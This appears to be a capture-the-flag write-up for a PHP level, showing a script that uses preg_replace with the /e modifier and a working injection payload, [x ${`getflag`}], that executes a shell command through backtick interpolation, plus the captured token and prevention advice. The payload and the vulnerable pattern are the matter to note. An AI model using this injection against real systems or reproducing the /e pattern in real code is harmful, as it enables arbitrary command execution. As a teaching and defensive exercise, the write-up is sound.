# Level 06 - PHP preg_replace /e Code Execution

## Objective
Exploit a PHP regex vulnerability to execute commands as `flag06`.

## My Notes

Found a PHP script. Let me see what it does:
```bash
cat level06.php
```

```php
<?php
function y($m) { 
    $m = preg_replace("/\./", " x ", $m); 
    $m = preg_replace("/@/", " y", $m); 
    return $m; 
}

function x($y, $z) { 
    $a = file_get_contents($y); 
    $a = preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a);  // ← VULNERABLE!
    $a = preg_replace("/\[/", "(", $a); 
    $a = preg_replace("/\]/", ")", $a); 
    return $a; 
}

$r = x($argv[1], $argv[2]); 
print $r;
?>
```

The dangerous line is: `preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a);`

The `/e` modifier is dangerous - it evaluates the replacement string as PHP code. This was deprecated in PHP 5.5 and removed in PHP 7.0 because it's inherently insecure.

The regex matches strings like `[x hello]` and captures "hello" in group 2. The replacement `y("\\2")` calls function `y()` with the captured text.

Since `/e` evaluates the replacement as PHP code, if I can control what goes into `\\2`, I can inject PHP code. PHP has variable interpolation in double-quoted strings, and backticks execute shell commands.

Created exploit file:
```bash
cat > /tmp/exploit06 << "EOF"
[x ${`getflag`}]
EOF

./level06 /tmp/exploit06
```

When the regex matches, it captures `${`getflag`}` as group 2, creates replacement `y("${`getflag`}")`, PHP evaluates this, and the backticks execute getflag.

Token: `wiok45aaoguiboiki2tuin6ub`

## Key Takeaways

**The /e modifier:** In old PHP, `preg_replace()` with `/e` evaluated the replacement as PHP code. Use `preg_replace_callback()` instead. The /e modifier was removed in PHP 7.0.

**PHP string interpolation:** In double-quoted strings, PHP expands variables and expressions like `${expr}`. Complex expressions can call functions.

**PHP backtick operator:** Backticks execute shell commands, equivalent to `shell_exec()`.

**Attack chain:** Create file with `[x ${`getflag`}]` → script reads file → regex matches → replacement evaluated as PHP → backticks execute getflag.

## Tools Used
- `cat` with heredoc to create file with special chars

## Prevention
- Never use /e modifier - use `preg_replace_callback()` instead
- Update PHP to 7+ where /e doesn't exist
- Code review for regex patterns
- Static analysis tools can detect this
- Run PHP with minimal privileges
